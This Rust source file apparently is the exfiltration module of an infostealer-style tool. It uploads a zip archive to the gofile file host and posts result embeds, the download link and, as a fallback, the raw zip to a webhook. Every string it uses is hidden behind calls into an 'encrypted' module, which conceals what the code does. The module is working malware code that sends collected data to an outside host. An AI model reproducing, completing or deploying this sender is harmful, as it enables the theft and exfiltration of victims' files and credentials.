use std::time::Duration;
use serde_json::{json, Value};
use crate::encrypted::*;

pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_name: &str) -> Option<String> {
    let upload_url = s_gofile_upload_url();
    
    let zip_part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(zip_name.to_string())
        .mime_str(&s_sender_application_zip())
        .ok()?;
    
    let form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
    
    let response = match client
        .post(&upload_url)
        .header(s_sender_origin(), &s_gofile_domain())
        .header(s_sender_referer(), &s_gofile_referer())
        .multipart(form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(_) => return None,
    };
    
    let body = response.text().await.ok()?;

    let v: Value = match serde_json::from_str(&body) {
        Ok(j) => j,
        Err(_) => {
            if body.contains(&s_sender_gofile_io()) || body.contains(&s_sender_download()) {
                if let Some(start) = body.find(&s_sender_https()) {
                    for delim in ['"', '\'', ' '] {
                        if let Some(end) = body[start..].find(delim) {
                            return Some(body[start..start + end].to_string());
                        }
                    }
                }
            }
            return None;
        }
    };

    if v["status"].as_str() != Some("ok") { return None; }
    let data = &v["data"];
    if let Some(s) = data["downloadPage"].as_str().filter(|s| !s.is_empty()) { return Some(s.to_owned()); }
    if let Some(s) = data["directLink"].as_str().filter(|s| !s.is_empty()) { return Some(s.to_owned()); }
    if let Some(id) = data["fileId"].as_str().filter(|s| !s.is_empty()) {
        return Some(format!("{}/{}", s_gofile_download_path(), id));
    }
    None
}

pub async fn send_to_webhook(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: Vec<serde_json::Value>,
    zip_data: Vec<u8>,
    zip_name: String,
) -> Vec<String> {
    let mut statuses: Vec<String> = Vec::new();

    // Send embeds immediately — don't wait for gofile upload.
    for (ci, chunk) in embeds.chunks(10).enumerate() {
        let payload = json!({ s_sender_embeds(): chunk });
        let r = client.post(webhook_url).json(&payload).send().await;
        statuses.push(format!("{}{}]={}", s_sender_embeds_status(), ci, r.map(|r| r.status()).unwrap_or_default()));
    }

    // Try gofile with a short timeout so we don't block the webhook for minutes.
    let gofile_link = tokio::time::timeout(
        Duration::from_secs(12),
        upload_to_gofile(client, zip_data.clone(), &zip_name),
    )
    .await
    .ok()
    .flatten();

    statuses.push(if gofile_link.is_some() { s_sender_gofile_ok() } else { s_sender_gofile_fail() });

    let mut content = String::new();
    if let Some(ref link) = gofile_link {
        content = format!("\u{1f4e6} Download: {}", link);
    }

    let r = client.post(webhook_url).json(&json!({s_sender_content(): content})).send().await;
    statuses.push(format!("content={}", r.map(|r| r.status()).unwrap_or_default()));

    if gofile_link.is_none() {
        if let Ok(zip_part) = reqwest::multipart::Part::bytes(zip_data)
            .file_name(zip_name)
            .mime_str(&s_sender_application_zip())
        {
            let zip_form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
            let r = tokio::time::timeout(
                Duration::from_secs(60),
                client.post(webhook_url).multipart(zip_form).send(),
            )
            .await
            .ok()
            .and_then(|r| r.ok());
            statuses.push(format!("zip_fallback={}", r.map(|r| r.status()).unwrap_or_default()));
        }
    }

    statuses
}
